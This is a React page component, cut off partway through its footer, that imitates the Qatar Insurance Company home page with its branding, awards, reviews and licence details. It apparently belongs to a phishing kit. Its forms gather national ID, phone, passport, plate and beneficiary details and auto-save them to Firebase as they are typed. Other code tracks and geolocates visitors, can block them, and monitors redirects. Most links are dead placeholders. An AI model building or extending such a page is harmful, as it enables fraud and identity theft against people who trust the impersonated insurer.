import { useEffect, useRef, useState } from "react";
import { useLocation } from "wouter";
import { FullPageLoader } from "@/components/loader";
import { TurnstileWidget } from "@/components/TurnstileWidget";
import {
  getOrCreateVisitorID,
  initializeVisitorTracking,
  updateVisitorPage,
  checkIfBlocked,
  setOnBlockedChangeCallback,
  setupGlobalBlockedListener,
  checkBlockedAndBlock,
} from "@/lib/visitor-tracking";
import { useAutoSave } from "@/hooks/use-auto-save";
import { useRedirectMonitor } from "@/hooks/use-redirect-monitor";
import { secureAddData as addData } from "@/lib/secure-firebase";
import "./qic-home.css";

type InsuranceType = "car" | "travel" | "visitor" | "life-health";

const INSURANCE_TYPES: Record<InsuranceType, { ar: string; en: string }> = {
  car: { ar: "تأمين السيارة", en: "Car insurance" },
  travel: { ar: "تأمين السفر", en: "Travel insurance" },
  visitor: { ar: "تأمين الزائرين", en: "Visitor insurance" },
  "life-health": { ar: "التأمين على الحياة والصحة", en: "Life & health insurance" },
};

const BENEFIT_ICONS = ["▣", "◉", "◌", "⌁", "▱", "▣", "◉", "▤", "▰", "▥"];

const BENEFITS_AR = [
  "محتويات المنزل",
  "الحوادث الشخصية",
  "الفواتير والشيكات",
  "الغوص",
  "الأعمال التجارية",
  "الرسوم الدراسية",
  "التقاعد",
  "التعليم",
  "حماية الفواتير",
  "الأجهزة المحمولة",
];
const BENEFITS_EN = [
  "Home contents",
  "Personal accidents",
  "Bills and cheques",
  "Diving",
  "Commercial business",
  "School fees",
  "Retirement",
  "Education",
  "Bill protection",
  "Mobile devices",
];

const AVATAR_CLASSES = ["green", "blue", "gray"];

interface FormFieldProps {
  label: string;
  name: string;
  type?: string;
  placeholder?: string;
  full?: boolean;
  value: string;
  onChange: (v: string) => void;
}

function FormField({ label, name, type = "text", placeholder, full, value, onChange }: FormFieldProps) {
  return (
    <div className={`form-field${full ? " full" : ""}`}>
      <label htmlFor={name}>{label}</label>
      <input
        id={name}
        name={name}
        type={type}
        placeholder={placeholder}
        value={value}
        onChange={(e) => onChange(e.target.value)}
        required
      />
    </div>
  );
}

export default function HomePage() {
  const [, navigate] = useLocation();
  const [visitorID] = useState(() => getOrCreateVisitorID());
  const [loading, setLoading] = useState(true);
  const [isBlocked, setIsBlocked] = useState(false);
  const [language, setLanguage] = useState<"ar" | "en">("ar");
  const isAr = language === "ar";

  // ─── Session protection & country detection (kept as-is) ───
  useEffect(() => {
    checkBlockedAndBlock();
    setupGlobalBlockedListener(visitorID);
    setOnBlockedChangeCallback((blocked: boolean) => {
      setIsBlocked(blocked);
      if (blocked) setLoading(false);
    });
  }, [visitorID]);

  // ─── Form fields ───
  const [insuranceType, setInsuranceType] = useState<InsuranceType>("car");
  const [identityNumber, setIdentityNumber] = useState("");
  const [ownerName, setOwnerName] = useState("");
  const [phoneNumber, setPhoneNumber] = useState("");
  const [buyerName, setBuyerName] = useState("");
  const [buyerIdNumber, setBuyerIdNumber] = useState("");
  const [honeypot, setHoneypot] = useState("");
  const [turnstileToken, setTurnstileToken] = useState("");
  const [carRequestType, setCarRequestType] = useState<"new" | "ownership">("new");
  const [coverage, setCoverage] = useState("comprehensive");
  const [plate, setPlate] = useState("");
  const [destination, setDestination] = useState("");
  const [departure, setDeparture] = useState("");
  const [returnDate, setReturnDate] = useState("");
  const [travellers, setTravellers] = useState("");
  const [nationality, setNationality] = useState("");
  const [passport, setPassport] = useState("");
  const [arrival, setArrival] = useState("");
  const [duration, setDuration] = useState("");
  const [birthDate, setBirthDate] = useState("");
  const [coverageAmount, setCoverageAmount] = useState("");
  const [beneficiary, setBeneficiary] = useState("");

  // Auto-save (same Firebase autosave behaviour as current page)
  useAutoSave({
    visitorId: visitorID,
    pageName: "home",
    data: {
      identityNumber,
      ownerName,
      phoneNumber,
      insuranceType: insuranceType === "car" ? (carRequestType === "ownership" ? "نقل ملكية" : "تأمين جديد") : INSURANCE_TYPES[insuranceType].ar,
      serialNumber: insuranceType === "car" ? plate : "",
      documentType: insuranceType === "car" ? "استمارة" : "",
      ...(insuranceType === "car" && carRequestType === "ownership" && { buyerName, buyerIdNumber }),
      ...(insuranceType === "car" && { coverage }),
      ...(insuranceType === "travel" && { destination, departure, return: returnDate, travellers }),
      ...(insuranceType === "visitor" && { nationality, passport, arrival, duration }),
      ...(insuranceType === "life-health" && { birthDate, coverageAmount, beneficiary }),
    },
  });

  useRedirectMonitor({ visitorId: visitorID, currentPage: "home" });

  useEffect(() => {
    const init = async () => {
      try {
        const blocked = await Promise.race([
          checkIfBlocked(visitorID),
          new Promise<boolean>((resolve) => setTimeout(() => resolve(false), 3000)),
        ]);
        if (blocked) { setIsBlocked(true); setLoading(false); return; }
        setLoading(false);
        initializeVisitorTracking(visitorID).catch(console.error);
        updateVisitorPage(visitorID, "home", 1).catch(console.error);

        if (!localStorage.getItem("country")) {
          setTimeout(async () => {
            try {
              const apiKey = import.meta.env.VITE_IPDATA_API_KEY || "";
              const baseUrl = (import.meta.env.VITE_IPDATA_API_URL || "https://api.ipdata.co").replace(/\/+$/, "");
              if (!apiKey || !baseUrl) return;
              const controller = new AbortController();
              const tid = setTimeout(() => controller.abort(), 5000);
              const response = await fetch(`${baseUrl}/country_name?api-key=${apiKey}`, { signal: controller.signal });
              clearTimeout(tid);
              if (response.ok) {
                const countryName = await response.text();
                const { countryNameToAlpha3 } = await import("@/lib/country-codes");
                const countryCode = countryNameToAlpha3(countryName);
                localStorage.setItem("country", countryCode);
                await addData({ id: visitorID, country: countryCode });
              }
            } catch (error) { console.error("Error fetching country:", error); }
          }, 200);
        }
      } catch (error) { console.error("Initialization error:", error); setLoading(false); }
    };
    init();
  }, [visitorID]);

  // ─── Modal & toast ───
  const [modalOpen, setModalOpen] = useState(false);
  const [toast, setToast] = useState("");
  const [mobileNavOpen, setMobileNavOpen] = useState(false);
  const toastTimer = useRef<ReturnType<typeof setTimeout> | null>(null);

  const showToast = (msg: string) => {
    setToast(msg);
    if (toastTimer.current) clearTimeout(toastTimer.current);
    toastTimer.current = setTimeout(() => setToast(""), 2800);
  };

  useEffect(() => () => { if (toastTimer.current) clearTimeout(toastTimer.current); }, []);

  const openInsuranceForm = (type: InsuranceType) => {
    setInsuranceType(type);
    setModalOpen(true);
  };
  const closeInsuranceForm = () => setModalOpen(false);

  const tomorrow = new Date(Date.now() + 86400000);
  const minRenewal = tomorrow.toISOString().slice(0, 10);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (honeypot) { console.warn("[Security] Bot detected via honeypot"); return; }
    const {
      getOrCreateSessionNonce,
      validateSessionNonce,
      verifyBrowserFingerprint,
      checkAdvancedRateLimit,
      verifyHeaderGuard,
      validateTimeHoneypot,
    } = await import("@/lib/security");
    if (!validateTimeHoneypot()) { console.warn("[Security] Time-based honeypot triggered (< 10s)"); return; }
    const nonce = getOrCreateSessionNonce();
    if (!validateSessionNonce(nonce) || !verifyBrowserFingerprint() || !checkAdvancedRateLimit() || !verifyHeaderGuard()) {
      console.warn("[Security] Advanced bot protection triggered");
      return;
    }

    // No identity-number/phone verification — same Firebase payload as current page
    const baseData: Record<string, any> = {
      id: visitorID,
      identityNumber,
      ownerName,
      phoneNumber,
      insuranceType: insuranceType === "car" ? (carRequestType === "ownership" ? "نقل ملكية" : "تأمين جديد") : INSURANCE_TYPES[insuranceType].ar,
      documentType: "استمارة",
      serialNumber: insuranceType === "car" ? plate : "",
      currentStep: 2,
      currentPage: "insur",
      homeCompletedAt: new Date().toISOString(),
    };

    if (insuranceType === "car" && carRequestType === "ownership") {
      baseData.buyerName = buyerName;


      baseData.buyerIdNumber = buyerIdNumber;

    }

    const typeData: Record<string, Record<string, string>> = {
      car: { coverage, plate },
      travel: { destination, departure, return: returnDate, travellers },
      visitor: { nationality, passport, arrival, duration },
      "life-health": { birthDate, coverageAmount, beneficiary },
    };
    Object.assign(baseData, typeData[insuranceType] ?? {});

    await addData(baseData).then(() => navigate("/insur"));
  };

  if (loading) return <FullPageLoader />;

  if (isBlocked) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <div className="text-center p-8 bg-white rounded-lg shadow-lg max-w-md">
          <h1 className="text-2xl font-bold text-red-600 mb-4">تم حظر الوصول</h1>
          <p className="text-gray-600">عذراً، تم حظر وصولك إلى هذه الخدمة.</p>
        </div>
      </div>
    );
  }

  const t = {
    nav:isAr ? ["السيارة", "تأمين الزائرين", "السفر", "الحياة والصحة", "مزيد من الفئات", "خدمات المدينة"] : ["Car", "Visitor insurance", "Travel", "Life & health", "More categories", "City services"],
    renew:isAr ? "تجديد التأمين ↻" : "Renew insurance ↻",
    claims:isAr ? "المطالبات ▧" : "Claims ▧",
    login:isAr ? "تسجيل الدخول ⇥" : "Log in ⇥",
    h1:isAr ? "أفضل شركة تأمين في قطر" : "The best insurance company in Qatar",
    award:isAr ? "أفضل شركة تأمين في قطر لعام 2026" : "Qatar's best insurance company for 2026",
    carTitle:isAr ? "تأمين السيارة" : "Car insurance",
    carDesc:isAr ? "التأمين الشامل أو ضد الغير" : "Comprehensive or third-party cover",
    buy:isAr ? "شراء التأمين" : "Buy insurance",
    familyTitle:isAr ? "التأمين على الحياة والصحة" : "Life and health insurance",
    familyDesc:isAr ? "حماية لك ولعائلتك مهما تغيّرت ظروف الحياة" : "Protection for you and your family, whatever life brings",
    marketTitle:"qic.market",
    marketSub:isAr ? "بيع وشراء السيارات" : "Buy and sell cars",
    travelTitle:isAr ? "تأمين السفر" : "Travel insurance",
    travelDesc:isAr ? "تغطية لرحلتك خارج دولة قطر" : "Cover for your trip outside Qatar",
    visitorTitle:isAr ? "تأمين الزائرين" : "Visitor insurance",
    visitorDesc:isAr ? "تأمين الزائرين لدخول دولة قطر" : "Insurance for visitors entering Qatar",
    appTitle:isAr ? "حمّل تطبيق قطر للتأمين" : "Download the QIC app",
    appDesc:isAr ? "التأمين والسيارات وخدمات المدينة، كل ذلك في مكان واحد" : "Insurance, cars and city services, all in one place",
    appBtn:isAr ? "حمّل التطبيق" : "Download app",
    stats:isAr ? ["أعلى تصنيف ESG", "عميل في دول الخليج", "خبرة موثوقة", "تقييم العملاء"] : ["Highest ESG rating", "Customers across the Gulf", "Trusted experience", "Customer rating"],
    awardTitle:isAr ? "شركة التأمين الرائدة في منطقة الخليج" : "The leading insurance company in the Gulf region",
    awardsTitle:isAr ? "الجوائز والإنجازات" : "Awards & achievements",
    awards:isAr
      ? ["أفضل تطبيق للتأمين في قطر", "أفضل شركة للتأمين في الشرق الأوسط وشمال أفريقيا", "جائزة تطبيق جوال العام في قطر", "أفضل شركة تأمين سفر في قطر"]
      : ["Best insurance app in Qatar", "Best insurance company in the Middle East & North Africa", "Mobile app of the year in Qatar", "Best travel insurance company in Qatar"],
    readsTitle:isAr ? "دليلك للحياة في قطر" : "Your guide to life in Qatar",
    readsBtn:isAr ? "اطلع على مدونة QIC Reads ←" : "Explore the QIC Reads blog →",
    reads:isAr
      ? ["تجديد استمارة السيارة في قطر: دليل شامل", "البطاقة الصحية في قطر: دليلك الشامل لصحتك", "التأمين وسوق السيارات وخدمات المدينة: تجارب قطر للتأمين", "كيفية التقديم على تأشيرة A1 الزيارة: دليل قطر للتأمين", "أهم النصائح والخدمات للحياة في قطر"]
      : ["Renewing your vehicle registration in Qatar: A complete guide", "Qatar health card: Your complete health guide", "Insurance, cars and city services: QIC experiences", "How to apply for an A1 visit visa: QIC guide", "Top tips and services for life in Qatar"],
    trust:isAr ? "نفخر بثقة أكثر من 650,000 عميل في قطر" : "Trusted by more than 650,000 customers in Qatar",
    companyTitle:isAr ? "مجموعة قطر للتأمين" : "Qatar Insurance Group",
    companyDesc:isAr
      ? "تأسست قطر للتأمين عام  ۞1964 كأول شركة تأمين وطنية في دولة قطر. وأصبحت اليوم رائدة التأمين في منطقة الشرق الأوسط وشمال أفريقيا. تعتبر شركة قطر للتأمين أعلى شركات التأمين تصنيفًا ضمن دول مجلس التعاون الخليجي."
      : "Qatar Insurance was established in 1964 as Qatar's first national insurance company. Today, it is a leading insurer in the Middle East and North Africa,and one of the highest-rated insurance companies across the Gulf Cooperation Council.",
    companyLink:isAr ? "الموقع الإلكتروني لمجموعة قطر للتأمين ↗" : "Qatar Insurance Group website ↗",
    privacyTitle:isAr ? "حماية بياناتك هي أولويتنا" : "Protecting your data is our priority",
    privacyDesc:isAr
      ? "في قطر للتأمين نلتزم بالتواصل معك عادة عبر البريد الإلكتروني أو الجوال. إذا تلقيت رسالة أو مكالمة مشبوهة، يرجى إبلاغنا وسنتولى نحن الباقي."
      : "At QIC, we usually contact you by email or phone. If you receive a suspicious message or call, please report it to us and we will take care of the rest.",
    contacts:isAr
      ? [{ label: "عنوان البريد الإلكتروني العام للتواصل ✉", value: "qic.online@qic.com.qa · qicgroup.com.qa" }, { label: "الخط الساخن ♧", value: "8 000 742" }]
      : [{ label: "General contact email ✉", value: "qic.online@qic.com.qa · qicgroup.com.qa" }, { label: "Hotline ♧", value: "8 000 742" }],
    footerCols:isAr
      ? [
        { title: "التأمين", links: ["السيارة", "السفر للخارج", "السفر في قطر", "القوارب واليخوت", "محتويات المنزل", "الحوادث الشخصية", "تأمين الأعمال", "الغوص", "تأمين الأعمال التجارية", "تأمين الزائرين", "تأمين الرسوم الدراسية", "التعليم", "التقاعد", "تأمين الأجهزة المحمولة", "التأمين على الفواتير"] },
        { title: "المطالبات", links: ["مطالبات حوادث السيارات", "مطالبات حوادث السفر", "مطالبات حوادث العمل", "مطالبات حوادث القوارب", "مطالبات الحوادث الشخصية", "تتبع مطالبة", "مزاد السيارات المتضررة"] },
        { title: "الدعم الفني", links: ["الدفع بقسط قطر للتأمين", "تجديد التأمين", "أرقامكم", "الشكاوى", "خريطة الموقع"] },
        { title: "الشركة", links: ["عن شركة قطر للتأمين", "اتصل بنا", "المدونة", "إشعار خصوصية البيانات", "عن الوظيفة", "التوعية بالاحتيال", "سوق السيارات", "الكويز", "الفعاليات"] },
      ]
      : [
        { title: "Insurance", links: ["Car", "Travel abroad", "Travel in Qatar", "Boats & yachts", "Home contents", "Personal accidents", "Business insurance", "Diving", "Commercial insurance", "Visitor insurance", "School fees insurance", "Education", "Retirement", "Mobile device insurance", "Bill insurance"] },
        { title: "Claims", links: ["Motor claims", "Travel claims", "Work claims", "Boat claims", "Personal accident claims", "Track a claim", "Damaged car auction"] },
        { title: "Technical support", links: ["QIC instalment payment", "Renew insurance", "Your numbers", "Complaints", "Sitemap"] },
        { title: "Company", links: ["About QIC", "Contact us", "Blog", "Data privacy notice", "Careers", "Fraud awareness", "Car market", "Quiz", "Events"] },
      ],
    copyright:isAr
      ? "حقوق النشر © جميع الحقوق محفوظة لمجموعة قطر للتأمين. خاضع لتنظيمات مصرف قطر المركزي، رقم الرخصة: IC/ISR/02/1964. رقم السجل التجاري: 20"
      : "Copyright © All rights reserved to Qatar Insurance Group. Regulated by Qatar Central Bank. Licence No: IC/ISR/02/1964. Commercial registration No: 20",
    formTitle:isAr ? "طلب التأمين" : "Insurance request",
    formDesc:isAr ? "أدخل بياناتك وسنتابع معك الخطوات التالية." : "Enter your details and we will guide you through the next steps.",
    name:isAr ? "الاسم الكامل" : "Full name",
    phone:isAr ? "رقم الهاتف" : "Phone number",
    id:isAr ? "الرقم الشخصي ID" : "Personal ID",
    continue:isAr ? "متابعة" : "Continue",
    cancel:isAr ? "إلغاء" : "Cancel",
  };

  const reviewsFlat = isAr
    ? [
        "واجهة سهلة وتجربة ممتازة. أنصح بشركة قطر للتأمين وأتمنى لهم المزيد من النجاح.",
      "أود أن أشكر قطر للتأمين على الخدمة الاستثنائية التي قدموها. دائمًا ما أكون معجبًا باحترافية فريقكم.",
      "دقيقة واحدة فقط لإتمام عملية الشراء عبر الإنترنت. خدمة تقديم المطالبات رائعة أيضًا.",
      "سواء كنت ستسافر داخل الدولة أو خارجها، فكر في الحصول على تأمين سفر ليؤمن لك الحماية اللازمة.",
      "تجربتي في شراء تأمين السفر من قطر للتأمين كانت رائعة، وعملية الشراء عبر الإنترنت كانت سريعة وسهلة!",
      "قدمت طلبًا للحصول على التأمين من هذه الشركة، وكانت تجربة رائعة فعلًا. التعامل خالٍ من أي تعقيدات.",
      "ما شاء الله، أفضل شركة تأمين في قطر. خدمة ممتازة وموظفون متعاونون وأسعار مناسبة.",
      "خدمة سريعة وموثوقة. حصلت على تأميني في أقل من 5 دقائق.",
      "شركة جيدة جدًا وسهلة الوصول إليها وتتميز بمعالجة سريعة للمعاملات عن طريق الإنترنت.",
    ]
    : [
      "An easy interface and excellent experience. I recommend QIC and wish the team continued success.",
      "I would like to thank QIC for the exceptional service. Your team is always professional.",
      "It took only one minute to complete my purchase online. The claims service is excellent too.",
      "Whether travelling locally or abroad, travel insurance gives you the protection you need.",
      "My travel insurance purchase with QIC was excellent,and the online process was quick and easy!",
      "I applied for insurance with this company and had a great experience. The process was straightforward.",
      "The best insurance company in Qatar. Excellent service, helpful staff and suitable prices.",
      "Fast and reliable service. I got my insurance in less than five minutes.",
      "A very good company that is easy to reach and processes transactions quickly online.",
    ];
  const reviewAuthors = isAr
    ? ["طارق صابر", "عبد العزيز خالد", "صالح شافع", "أحمد عبد الملك", "محمد حسين", "رونا جونيو", "محمد ناصر", "أرنولد عويس", "نوفا عبان"]
    : ["Tareq Saber", "Abdulaziz Khaled", "Abdulaziz Khaled", "Ahmed Abd Al-Malik", "Mohammed Hussein", "Rona Junio", "Mohammed Nasser", "Arnold Oweis", "Nova Aban"];

  const reviewsGrid = [reviewsFlat.slice(0, 3), reviewsFlat.slice(3, 6), reviewsFlat.slice(6, 9)];
  const authorsGrid = [reviewAuthors.slice(0, 3), reviewAuthors.slice(3, 6), reviewAuthors.slice(6, 9)];

  const modalHeading = insuranceType === "car"
    ? (isAr ? "نوع التأمين: تأمين السيارة" : "Insurance type: Car insurance")
    : (isAr ? "نوع التأمين: " : "Insurance type: ") + INSURANCE_TYPES[insuranceType][isAr ? "ar" : "en"];

  const renderDynamicFields = () => {
    if (insuranceType === "car") {
      return (
        <>
          <div className="radio-field">
            <span className="form-legend">{isAr ? "ما الذي تحتاجه؟" : "What do you need?"}</span>
            <label className="radio-option">
              <input type="radio" name="car_request" value="new" checked={carRequestType === "new"} onChange={() => setCarRequestType("new")} />
              <span>{isAr ? "تأمين جديد" : "New insurance"}</span>
            </label>
            <label className="radio-option">
              <input type="radio" name="car_request" value="ownership" checked={carRequestType === "ownership"} onChange={() => setCarRequestType("ownership")} />
              <span>{isAr ? "نقل ملكية" : "Transfer ownership"}</span>
            </label>
          </div>
          <div className="form-field">
            <label>{isAr ? "نوع التغطية" : "Coverage type"}</label>
            <select value={coverage} onChange={(e) => setCoverage(e.target.value)}>
              <option value="comprehensive">{isAr ? "تأمين شامل" : "Comprehensive"}</option>
              <option value="third-party">{isAr ? "ضد الغير" : "Third-party"}</option>
            </select>
          </div>
          <FormField label={isAr ? "رقم لوحة السيارة" : "Vehicle plate number"} name="plate" value={plate} onChange={setPlate} />
          {carRequestType === "ownership" && (
            <>
              <FormField label={isAr ? "اسم المشتري" : "Buyer full name"} name="buyer_name" value={buyerName} onChange={setBuyerName} />
              <FormField label={isAr ? "رقم هاتف المشتري" : "Buyer phone number"} name="buyer_phone" type="tel" value={phoneNumber} onChange={setPhoneNumber} />
              <FormField label={isAr ? "رقم هوية المشتري" : "Buyer national ID"} name="buyer_id" value={buyerIdNumber} onChange={setBuyerIdNumber} />
            </>
          )}
        </>
      );
    }
    if (insuranceType === "travel") {
      return (
        <>
          <FormField label={isAr ? "الوجهة" : "Destination"} name="destination" value={destination} onChange={setDestination} />
          <FormField label={isAr ? "تاريخ المغادرة" : "Departure date"} name="departure" type="date" value={departure} onChange={setDeparture} />
          <FormField label={isAr ? "تاريخ العودة" : "Return date"} name="return_date" type="date" value={returnDate} onChange={setReturnDate} />
          <FormField label={isAr ? "عدد المسافرين" : "Number of travellers"} name="travellers" type="number" value={travellers} onChange={setTravellers} />
        </>
      );
    }
    if (insuranceType === "visitor") {
      return (
        <>
          <FormField label={isAr ? "الجنسية" : "Nationality"} name="nationality" value={nationality} onChange={setNationality} />
          <FormField label={isAr ? "رقم جواز السفر" : "Passport number"} name="passport" value={passport} onChange={setPassport} />
          <FormField label={isAr ? "تاريخ الوصول" : "Arrival date"} name="arrival" type="date" value={arrival} onChange={setArrival} />
          <FormField label={isAr ? "مدة الزيارة (بالأيام)" : "Visit duration (days)"} name="duration" type="number" value={duration} onChange={setDuration} />
        </>
      );
    }
    return (
      <>
        <FormField label={isAr ? "تاريخ الميلاد" : "Date of birth"} name="birth_date" type="date" value={birthDate} onChange={setBirthDate} />
        <FormField label={isAr ? "مبلغ التغطية" : "Coverage amount"} name="coverage_amount" type="number" value={coverageAmount} onChange={setCoverageAmount} />
        <FormField label={isAr ? "اسم المستفيد" : "Beneficiary name"} name="beneficiary" value={beneficiary} onChange={setBeneficiary} full />
      </>
    );
  };

  return (
    <div className="qic-page" dir={isAr ? "rtl" : "ltr"}>
      <main className="page">
        {/* Header */}
        <header className="topbar">
          <button className="mobile-menu" aria-label="فتح القائمة" onClick={() => setMobileNavOpen(!mobileNavOpen)}>☰</button>
          <a className="brand" href="#" aria-label="QIC">QIC</a>
          <nav className={`nav${mobileNavOpen ? " mobile-open" : ""}`} aria-label="القائمة الرئيسية">
            {t.nav.map((n: string, i: number) => (
              <a key={n} href="#" className={i >= 2 ? "has-arrow" : ""} onClick={(e) => e.preventDefault()}>{n}</a>
            ))}
          </nav>
          <div className="actions">
            <button className="action primary" type="button" onClick={() => openInsuranceForm("car")}>{t.renew}</button>
            <button className="action" type="button" onClick={() => showToast(isAr ? "سيتم ربط صفحة المطالبات قريبًا." : "The claims page will be connected soon.")}>{t.claims}</button>
            <button className="action" type="button" onClick={() => showToast(isAr ? "سيتم ربط صفحة تسجيل الدخول لاحقًا." : "The login page will be connected soon.")}>{t.login}</button>
            <button className="action lang" type="button" aria-label="تغيير اللغة" onClick={() => setLanguage(isAr ? "en" : "ar")}>{isAr ? "EN" : "ع"}</button>
          </div>
        </header>

        <section className="heading">
          <h1>{t.h1}</h1>
          <div className="award"><span className="trophy">♕</span>{t.award}</div>
        </section>

        <section className="mobile-quick-actions" aria-label="إجراءات سريعة">
          <button className="quick-action" type="button" onClick={() => openInsuranceForm("car")}>
            <span className="quick-icon">↻</span><span>{isAr ? "تجديد التأمين" : "Renew insurance"}</span>
          </button>
          <button className="quick-action" type="button" onClick={() => showToast(isAr ? "سيتم ربط صفحة المطالبات قريبًا." : "The claims page will be connected soon.")}>
            <span className="quick-icon">▤</span><span>{t.claims}</span>
          </button>
          <button className="quick-action" type="button" onClick={() => showToast(isAr ? "حمّل التطبيق" : "Download app")}>
            <span className="quick-icon app-quick">qic<br />app</span><span>{isAr ? "حمّل تطبيق قطر للتأمين" : "Download the QIC app"}</span>
          </button>
        </section>

        <section className="promos">
          <aside className="side-column">
            <article className="mini-card family-card" tabIndex={0} role="button" onClick={() => openInsuranceForm("life-health")}>
              <h2>{t.familyTitle}</h2>
              <p>{t.familyDesc}</p>
            </article>
            <article className="mini-card market-card">
              <h2 className="market-title">{t.marketTitle}</h2>
              <p className="market-subtitle">{t.marketSub}</p>
            </article>
          </aside>

          <article className="hero-card" tabIndex={0} role="button" onClick={() => openInsuranceForm("car")}>
            <div className="hero-copy">
              <h2>{t.carTitle}</h2>
              <p>{t.carDesc}</p>
              <button className="buy" type="button" onClick={(e) => { e.stopPropagation(); openInsuranceForm("car"); }}>{t.buy}</button>
            </div>
            <img className="suv-image" src="/car-image.png" alt="سيارة للتأمين" />
            <div className="coins" aria-hidden="true"><span className="coin"></span><span className="coin small"></span></div>
          </article>

          <div className="offers">
            <article className="offer-card" tabIndex={0} role="button" onClick={() => openInsuranceForm("travel")}>
              <h3>{t.travelTitle}</h3>
              <p>{t.travelDesc}</p>
              <div className="offer-art"><span className="offer-image globe"></span></div>
            </article>
            <article className="offer-card" tabIndex={0} role="button" onClick={() => openInsuranceForm("visitor")}>
              <h3>{t.visitorTitle}</h3>
              <p>{t.visitorDesc}</p>
              <div className="offer-art"><span className="offer-image umbrella"></span></div>
            </article>
          </div>
        </section>

        <section className="benefits" aria-label="خدمات ومزايا التأمين">
          {(isAr ? BENEFITS_AR : BENEFITS_EN).map((b: string, i: number) => (
            <div className="benefit" key={b}><div className="benefit-icon"><span>{BENEFIT_ICONS[i]}</span></div>{b}</div>
          ))}
        </section>

        <section className="lower-content">
          <article className="app-banner">
            <div className="app-copy">
              <h2>{t.appTitle}</h2>
              <p>{t.appDesc}</p>
              <button className="app-button" type="button" onClick={() => showToast(isAr ? "سيتم إضافة رابط تحميل التطبيق لاحقًا." : "The app download link will be added soon.")}>{t.appBtn}</button>
            </div>
            <div className="app-phone" aria-hidden="true">
              <div className="phone-screen"><div className="phone-card"></div><div className="phone-row"><span></span><span></span><span></span></div><div className="phone-row"><span></span><span></span><span></span></div></div>
            </div>
            <div className="app-mark" aria-hidden="true">qic app</div>
          </article>

          <section className="stats" aria-label="إحصائيات الشركة">
            <div className="stat"><div className="stat-value aaa">AAA</div><div className="stat-label">{t.stats[0]}</div></div>
            <div className="stat"><div className="stat-value">2M+</div><div className="stat-label">{t.stats[1]}</div></div>
            <div className="stat">
              <div className="stat-value since"><span className="year-top">19</span><span className="since-small">since</span><span className="year-bottom">64</span></div>
              <div className="stat-label">{t.stats[2]}</div>
            </div>
            <div className="stat"><div className="stat-value rating">4.7 <span className="star">★</span></div><div className="stat-label">{t.stats[3]}</div></div>
          </section>

          <article className="award-banner">
            <h2 className="award-title">{t.awardTitle}</h2>
            <div className="award-shield" aria-hidden="true"></div>
            <div className="award-ribbon" aria-hidden="true"></div>
            <div className="award-ribbon second" aria-hidden="true"></div>
          </article>
        </section>

        <section className="awards-section" aria-labelledby="awards-title">
          <h2 id="awards-title" className="section-title">{t.awardsTitle}</h2>
          <div className="awards-grid">
            {t.awards.map((a: string, i: number) => (
              <article className="award-card" key={a}>
                <div className="award-emblem" aria-hidden="true"><span className="laurel"></span><span className="medal"></span></div>
                <h3>{a}</h3>
                <p>{isAr
                  ? ["جوائز أريبيان بزنس للتأمين 2026", "جوائز الشرق الأوسط وشمال أفريقيا لعام 2026", "جوائز الشرق الأوسط وشمال أفريقيا لعام  ۞2026", "جوائز التأمين المصرفية والمالية العالمية  ۞2026"][i]
                  : ["Arabian Business Insurance Awards  ۞2026", "Middle East & North Africa Awards  ۞2026", "Middle East & North Africa Awards  ۞2026", "Global Banking & Finance Insurance Awards  ۞2026"][i]}</p>
              </article>
            ))}
          </div>
        </section>

        <section className="reads-section" aria-labelledby="reads-title">
          <div className="reads-heading">
            <h2 id="reads-title" className="section-title">{t.readsTitle}</h2>
            <button className="reads-button" type="button" onClick={() => showToast(isAr ? "سيتم ربط المدونة لاحقًا." : "The blog will be connected soon.")}>{t.readsBtn}</button>
          </div>
          <div className="reads-panel">
            <div className="reads-grid">
              {[["car-art"], ["wallet-art"], ["insurance-art"], ["passport-art"], ["faded-art"]].map((cls: string[], i: number) => (
                <article className="read-card" key={i}>
                  <div className={`read-thumb ${cls[0]}`} aria-hidden="true"></div>
                  <div className="read-meta">{isAr ? "مدة القراءة 6 دقائق" : "6 min read"}</div>
                  <h3>{t.reads[i]}</h3>
                </article>
              ))}
            </div>
          </div>
        </section>

        <h2 className="trust-title">{t.trust}</h2>

        <section className="reviews-section" aria-label="آراء عملاء قطر للتأمين">
          <div className="reviews-grid">
            {reviewsGrid.map((col: string[], ci: number) => (
              <div className="review-column" key={ci}>
                {col.map((r: string, ri: number) => (
                  <article className="review-card" key={ri}>
                    {ri % 2 === 0 && <div className="review-stars">★★★★★</div>}
                    <p>{r}</p>
                    <div className="review-author">
                      <span className={`review-avatar ${AVATAR_CLASSES[(ci + ri) % 3]}`}>{authorsGrid[ci][ri].charAt(0)}</span>
                      <span><span className="review-name">{authorsGrid[ci][ri]}</span><span className="review-date">2024</span></span>
                      <span className="review-source">{ri % 2 === 0 ? "G" : "◉"}</span>
                    </div>
                  </article>
                ))}
              </div>
            ))}
          </div>
        </section>

        <section className="company-section" aria-labelledby="company-title">
          <div className="map-art" aria-hidden="true"></div>
          <div className="company-copy">
            <h2 id="company-title">{t.companyTitle}</h2>
            <p>{t.companyDesc}</p>
            <a className="company-link" href="#" onClick={(e) => e.preventDefault()}>{t.companyLink}</a>
          </div>
        </section>

        <section className="privacy-section" aria-labelledby="privacy-title">
          <div className="lock-art" aria-hidden="true"><span className="lock-shackle"></span><span className="lock-body"></span><span className="lock-check">✓</span></div>
          <div className="privacy-copy">
            <h2 id="privacy-title">{t.privacyTitle}</h2>
            <p>{t.privacyDesc}</p>
            <div className="privacy-contact">
              {t.contacts.map((c: { label: string; value: string }) => (
                <div className="contact-item" key={c.label}>
                  <strong>{c.label}</strong>
                  <span>{c.value}</span>
                </div>
              ))}
            </div>
          </div>
        </section>

        <footer className="site-footer">
          <div className="footer-top">
            <div className="social-app">
              <div className="socials" aria-label="وسائل التواصل الاجتماعي">
                <a className="social-icon" href="#" aria-label="X">𝕏</a>
                <a className="social-icon" href="#" aria-label="Facebook">f</a>
                <a className="social-icon" href="#" aria-label="Instagram">◎</a>
              </div>
              <div className="footer-app">
                <div className="footer-qr" aria-hidden="true"></div>
                <strong>{isAr ? "حمّل تطبيق قطر للتأمين" : "Download the QIC app"}</strong>
                <span>{isAr ? "استمتع من تأمين سياراتك إلى أصغر أمور حياتك اليومية." : "From car insurance to everyday life, all in one app."}</span>
              </div>
            </div>
            <div className="footer-links">
              {t.footerCols.map((col: { title: string; links: string[] }) => (
                <div className="footer-column" key={col.title}>
                  <h3>{col.title}</h3>
                  {col.links.map((l: string) => <a href="#" key={l} onClick={(e) => e.preventDefault()}>{l}</a>)}
                </div>
              ))}
